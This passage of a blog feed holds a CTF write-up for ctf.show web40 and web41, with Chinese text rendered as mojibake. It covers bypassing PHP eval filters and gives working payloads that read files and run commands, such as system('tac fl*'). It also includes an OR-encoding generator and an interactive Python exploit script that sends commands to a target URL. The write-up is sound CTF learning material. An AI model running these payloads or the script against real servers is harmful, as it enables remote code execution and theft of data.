       </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fuzzæŸ¥çœ‹pregmatchå‰©ä½™å­—ç¬¦"><a href="#fuzzæŸ¥çœ‹pregmatchå‰©ä½™å­—ç¬¦" class="headerlink" title="fuzzæŸ¥çœ‹pregmatchå‰©ä½™å­—ç¬¦"></a>fuzzæŸ¥çœ‹pregmatchå‰©ä½™å­—ç¬¦</h2><p>å…ˆfuzzä¸€ä¸‹å‰©ä¸‹äº†å“ªäº›å¸¸ç”¨å­—ç¬¦ï¼šï¼ˆä»–çœ‹ç€è¿‡æ»¤äº†æ‹¬å·ï¼Œä½†å®é™…ä¸Šæ˜¯ä¸­æ–‡é‡Œçš„æ‹¬å·ã€‚ã€‚ã€‚ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678722206004-f1d59aca-48dc-4732-a094-8bd2ad896196.png" alt="image.png"><br>çœ‹åˆ°ç»“æœæ€è€ƒäº†åŠå¤©æ²¡æœ‰æƒ³æ³•ï¼Œçœ‹äº†çœ‹wpå­¦åˆ°äº†æ–°å§¿åŠ¿ï¼š</p><h2 id="å¥—å¨ƒè§£æ³•"><a href="#å¥—å¨ƒè§£æ³•" class="headerlink" title="å¥—å¨ƒè§£æ³•"></a>å¥—å¨ƒè§£æ³•</h2><blockquote><p><a href="https://ctf.show/writeups/1002659">https://ctf.show/writeups/1002659</a><br><a href="https://blog.csdn.net/weixin_46250265/article/details/114266578">https://blog.csdn.net/weixin_46250265/article/details/114266578</a><br><a href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p></blockquote><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>æ¥è‡ªé¢˜ç›®ä¸‹æ–¹çš„hintï¼š<br>uploadï¼š<code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br>åˆ†æä¸€ä¸‹æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå…ˆè§£é‡Šä¸€ä¸‹å…¶ä¸­çš„å„ä¸ªå‡½æ•°éƒ½æ˜¯ä»€ä¹ˆæ„æ€ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()ï¼šè¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚å…¶ä¸­æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸ºç‚¹å·(.)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()ï¼šè·å–ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œ<span class="title function_ invoke__">scandir</span>(.)ï¼šè·å–å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span><br><span class="line"><span class="title function_ invoke__">pos</span>()ï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()ï¼šæ•°ç»„é€†åº</span><br><span class="line"><span class="title function_ invoke__">next</span>()ï¼š å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()ï¼šå‡½æ•°è¿›è¡Œæ–‡ä»¶å†…å®¹çš„è¯»å–ï¼Œå¹¶è¾“å‡º</span><br></pre></td></tr></table></figure><p>var_dumpä¸€ä¸‹localeconv()å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå¯¹åº”çš„å€¼æ˜¯<code>.</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678802966279-4fce3e4a-9652-4050-96bb-eabf4309afed.png" alt="image.png"><br>æ„é€ payloadã€‚é¦–å…ˆæ˜¯æˆ‘ä»¬è¦è¾“å‡ºåˆ—è¡¨ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼š<br><code>print_r(scandir(&#39;.&#39;));</code>ä½†æ˜¯å…¶ä¸­çš„ç‚¹å’Œå•å¼•å·å·²ç»è¢«è¿‡æ»¤æ‰äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡ä¸€ä¸‹ï¼Œè¿™å°±éœ€è¦ç”¨åˆ°ä¸Šé¢è¿™ä¸ªå‡½æ•°äº†ï¼ˆé€šè¿‡å‡½æ•°ä¼ å‚æ¥è·å¾—ï¼‰ã€‚æ‰€ä»¥æƒ³ä½¿ç”¨<code>localeconv()[&quot;decimal_point&quot;]</code>æ¥è·å–åˆ°<code>.</code>ä½†æ˜¯åŒå¼•å·å·²ç»è¢«è¿‡æ»¤äº†ã€‚<br>è¿™é‡Œæœ‰ä¸‰ä¸ªå‡½æ•°èƒ½å¤Ÿèµ·åˆ°æ›¿ä»£ä½œç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œ</span><br><span class="line"><span class="title function_ invoke__">pos</span>() åŒ <span class="title function_ invoke__">current</span>() ,æ˜¯<span class="title function_ invoke__">current</span>()çš„åˆ«å</span><br><span class="line"><span class="title function_ invoke__">reset</span>() å‡½æ•°è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå•å…ƒçš„å€¼ï¼Œå¦‚æœæ•°ç»„ä¸ºç©ºåˆ™è¿”å› <span class="literal">FALSE</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä¸€ä¸‹ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803619659-b2d38fe5-349a-4625-bcc9-161167344e25.png" alt="image.png"><br>è¿™æ—¶å€™payloadå·²ç»åˆå…·è§„æ¨¡äº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803689999-21e077e8-fcb2-43d7-a167-5d2f3d2a74e4.png" alt="image.png"><br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ®µpayloadè·å–åˆ°å½“å‰æ–‡ä»¶å¤¹çš„ä¿¡æ¯ï¼š<br><code>?c=var_dump(scandir(pos(localeconv())));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803871260-e3107088-3440-4dc7-a3ff-5ab5057ee454.png" alt="image.png"><br><em>å½“ç„¶è¿™æ¬¡æ˜¯flagæ–‡ä»¶å°±åœ¨å½“å‰æ–‡ä»¶å¤¹ï¼Œå¦‚æœä¸åœ¨å½“å‰æ–‡ä»¶å¤¹éœ€è¦ä½¿ç”¨ï¼š</em><code>_var_dump(scandir(&#39;../../&#39;));_</code><br>æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•è·å–åˆ°æ–‡ä»¶ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>highlight_file()</code>å‡½æ•°ï¼ˆæˆ–è€…ä½¿ç”¨<code>show_source()</code>ï¼‰æ¥æŸ¥çœ‹æ–‡ä»¶ã€‚ç„¶åå°±æ˜¯ç´¢å¼•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨nextã€endå‡½æ•°ç­‰ï¼Œä»¥ä¸‹ä¸ºç›¸å…³çš„æ–¹æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">end</span>()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">prev</span>()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">each</span>()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯flagæ–‡ä»¶ä¸åœ¨å¤´å°¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨array_reverseå‡½æ•°æ¥å€’è½¬ç„¶åé€šè¿‡<code>next</code>å‡½æ•°æ¥è·å–åˆ°æ–‡ä»¶ã€‚<br>è‡³æ­¤payloadå°±å¯ä»¥æ„å»ºäº†ï¼š<code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>å½“ç„¶ä¸å¯èƒ½åªæœ‰è¿™å‡ ä¸ªå‡½æ•°æ°å¥½èƒ½å¤Ÿæ»¡è¶³æ¡ä»¶ã€‚<br>æ¯”å¦‚è¯´å…¶ä¸­çš„poså‡½æ•°å¯ä»¥è¢«currentã€resetå‡½æ•°æ›¿æ¢ã€‚<br>show_resourceå‡½æ•°å¯ä»¥ä½¿ç”¨high_lightå‡½æ•°æ¥æ›¿æ¢ã€‚<br>posï¼ˆlocaleconvï¼ˆï¼‰ï¼‰çš„ç»„åˆå‡½æ•°ä¹Ÿå¯ä»¥è¢«getcwdå‡½æ•°æ›¿æ¢æ‰ã€‚ï¼ˆgetcwdå‡½æ•°ä¼šè¿”å›å½“å‰æ‰€åœ¨æ–‡ä»¶å¤¹ï¼‰ã€‚</p><h3 id="æ–¹æ³•äºŒåˆ©ç”¨sessionidï¼ˆå¥½åƒä¸è¡Œï¼‰"><a href="#æ–¹æ³•äºŒåˆ©ç”¨sessionidï¼ˆå¥½åƒä¸è¡Œï¼‰" class="headerlink" title="æ–¹æ³•äºŒåˆ©ç”¨sessionidï¼ˆå¥½åƒä¸è¡Œï¼‰"></a>æ–¹æ³•äºŒåˆ©ç”¨sessionidï¼ˆå¥½åƒä¸è¡Œï¼‰</h3><p>åˆ©ç”¨sessionidæ¥ä¼ å‚ï¼Œä½†ä¼¼ä¹ä¼ å‚ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯¹è¿™é“é¢˜æ¥è¯´å¥½åƒä¸å¤ªè¡Œâ€¦<br>uploadï¼š<code>?c=session_start();system(session_id());</code>ï¼Œcookieä¿®æ”¹ä¸ºï¼š<code>PHPSESSID=ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678806594280-0004a365-cdbd-46cd-b8b1-7691d0441e58.png" alt="image.png"></p><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><p>é¦–å…ˆæ˜¯payloadï¼š<code>?c=eval(array_pop(next(get_defined_vars())));</code>é™¤æ­¤ä¹‹å¤–éœ€è¦ç”¨postä¼ å…¥<code>1=system(&#39;tac fl*&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807377877-48a49a97-d692-427b-b685-6132ebc2fd30.png" alt="image.png"><br>åˆ†æï¼Œå…ˆè®²è¿°ä¸€ä¸‹å„ä¸ªå‡½æ•°çš„ä½œç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚ </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807006608-006af0ef-a25d-4623-bfb9-bcb58b1c5b0b.png" alt="image.png"><br>payloadçš„å«ä¹‰å°±æ˜¯åœ¨postä¸­å¯»æ‰¾åˆ°å¯¹åº”æœ¨é©¬ï¼Œå¹¶è¿è¡Œã€‚ã€</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é¢˜çœŸçš„æœ‰ç‚¹ä¸œè¥¿ï¼Œæ€è·¯ç®€å•å®¹æ˜“ç†è§£ï¼Œä½†æ˜¯éš¾åœ¨å¦‚ä½•æ‰¾åˆ°è¿”å›è¿™äº›éœ€è¦å‚æ•°çš„å‡½æ•°ã€‚</p><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸€ä¸‹å‰©ä½™å­—ç¬¦ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678884677705-956c818c-49fd-4272-8ebf-a47e532af942.png" alt="image.png"><br>æŠŠå­—ç¬¦éƒ½è¿‡æ»¤æ‰äº†ï¼Œè§‰å¾—åº”è¯¥æ˜¯ç”¨ä»€ä¹ˆæ–¹æ³•æ¥æ›¿ä»£å­—ç¬¦ï¼Œä½†æ˜¯ä¹‹åå°±æ²¡æœ‰æ€è·¯äº†ã€‚</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p></blockquote><p>çœ‹äº†wpï¼Œå‘ç°æƒ³æ³•æ²¡é—®é¢˜ã€‚<br>é¢˜ç›®ä¸­ç‰¹æ„æåˆ°äº†ï¼Œä¸Šæ¥å…ˆè€ƒè™‘çš„æ˜¯ï¼š<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ç•™ä¸‹äº†<code>|</code><br>wpæä¾›äº†ä¸¤ä¸ªè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">    <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#æ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡éœ€æ‰‹åŠ¨è¿è¡Œ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USERï¼špython exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;egï¼š  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰å°†phpå†™å…¥ç¯å¢ƒå˜é‡ï¼Œå°±éœ€è¦å…ˆè¿è¡Œrce_or.phpç”Ÿæˆæ–‡æœ¬ï¼Œå°†æ–‡æœ¬ç½®äºä¸exp.pyç›¸åŒç›®å½•ä¸‹ï¼Œè¿è¡Œexp.py<br>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py ä½ çš„å¯¹åº”url</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ†è´åœ¨functionå‚æ•°å’Œcommandå‚æ•°æ·»åŠ ä½ éœ€è¦çš„å‚æ•°ã€‚<br>æ¯”å¦‚systemå’Œlsã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678886696210-9bd0695d-c936-4068-86ac-77249e2e12e5.png" alt="image.png"></p><h1 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™éƒ¨åˆ†é¢˜å‰é¢åšç€è¿˜ç®—ç®€å•ï¼Œç›´åˆ°40ã€41ç›´æ¥æ¥äº†ä¸€ä¸ªæ¯ç­æ€§æ‰“å‡»ã€‚éš¾åº¦å’Œå‰é¢çš„æ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªé‡çº§çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web21-28çˆ†ç ´ç¯‡</title>
      <link href="/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/"/>
      <url>/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/</url>
      
